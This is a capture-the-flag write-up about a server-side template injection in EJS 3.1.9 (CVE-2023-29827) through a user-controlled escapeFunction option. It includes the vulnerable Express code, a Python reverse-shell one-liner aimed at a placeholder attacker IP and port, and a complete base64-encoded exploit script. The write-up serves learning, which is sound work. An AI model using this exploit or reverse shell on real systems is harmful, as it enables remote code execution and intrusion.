# Basic Injection

## Challenge Overview
**Vulnerability:** Server-Side Template Injection (SSTI) via EJS options.  

The root cause is that user-supplied JSON is passed directly to EJS as opts, allowing full control over code-generation properties like escapeFunction. This results in arbitrary JS execution during template compilation, enabling RCE through Node.js child_process.

## Static Analysis
The core vulnerability lies in `server.js`. The application accepts a `settings` query parameter, parses it as JSON, and passes it directly as the **third argument** (options) to `ejs.render`.

```javascript
const express = require('express');
const ejs = require('ejs');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => {
    const { username, settings } = req.query;
    
    if (!username) {
        return res.send('Missing param');
    }
    
    try {
        const template = '<h1>Welcome <%= username %>!</h1>';
        
        let opts = {};
        if (settings) {
            try {
                opts = JSON.parse(settings);
            } catch (e) {
                opts = {};
            }
        }
        
        let result;
        try {
            result = ejs.render(template, { username }, opts);
        } catch (renderError) {
            result = renderError.toString();
        }

        const limit = result.toString().slice(0, 35);
        
        res.send(limit);
    } catch (error) {
        const errorMsg = error.toString().slice(0, 35);
        res.status(500).send(errorMsg);
    }
});

const PORT = 5000;
app.listen(PORT, () => {
});
```

**The Vulnerability**: In EJS, the third argument controls compilation settings. If an attacker controls this object, they can inject arbitrary JavaScript into the compiled template function.

Closely examing the EJS version in `package.json`, we can see EJS's version is 3.1.9, so the classic exploitation via outputFunctionName won't work. 

After searching on the internet for a while, I encountered the issue *[EJS Server-side template injection leads to RCE](https://github.com/mde/ejs/issues/720)* and realized that this challenge is vulnerable to *CVE-2023-29827*. 

**Injection Logic**

If we send the following JSON:
```json
{
  "client": true,
  "escapeFunction": "(() => { INJECTED_CODE; return 'a'; })"
}
```
EJS generates code roughly like this:
```javascript
escapeFn = escapeFn || (() => { INJECTED_CODE; return 'a'; });
```

This executes our code immediately during the compilation process.

## Environment analysis
Dockerfile configuration:
```docker
FROM node:18-alpine

WORKDIR /app

COPY package.json .

RUN npm install
RUN apk add --no-cache python3
COPY server.js .
COPY static/style.css static/
COPY views/error.ejs views/
COPY views/index.ejs views/
COPY views/result.ejs views/
COPY flag /
EXPOSE 5000

CMD ["npm", "start"]
```
The provided Dockerfile revealed critical environment constraints:

- OS: node:18-alpine (Alpine Linux).

- Shell: /bin/sh (Ash). Note: bash is not installed by default, and /dev/tcp is often unavailable in pure Alpine sh.

- Installed Packages: apk add ... python3.

Because Alpine's sh is limited and standard reverse shells often fail, we utilized the pre-installed Python3 for a reliable reverse connection, specifically using python socket.

## Payload construction
Initial payload:
```bash
"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<YOUR_PUBLIC_IP>',<YOUR_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import subprocess;subprocess.call(['/bin/sh','-i'])"
```
However, Injecting a complex Python one-liner directly into a JSON string inside a URL query often leads to syntax errors due to quote collision (quotes inside Python, inside JSON, inside the URL). Therefore, I encoded the python command in Base64. 

## Final exploit script
```python
import requests
import json
import base64

url = <CHALLENGE_URL>
LHOST = <YOUR_PUBLIC_IP>
LPORT = <YOUR_PORT>

cmd = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import subprocess;subprocess.call(['/bin/sh','-i'])"
cmd = base64.b64encode(cmd.encode()).decode()

payload = {
    "client": True,
    "escapeFunction": f"(() => {{ process.mainModule.require('child_process').execSync(\"echo {cmd} | base64 -d | python3\"); return 'a'; }})"
}

params = {
    "username": "foo",
    "settings": json.dumps(payload) 
}

try:
    requests.get(url, params=params, timeout=2)
    print(f"[*] Payload sent to {url}!")
except requests.exceptions.Timeout:
    print("[+] Finished!")
except Exception as e:
    print(f"[-] Error: {e}")
```

## References
[EJS Server-side template injection leads to RCE](https://github.com/mde/ejs/issues/720)

[EJS Vulnerabilities in CTF by Huli](https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/)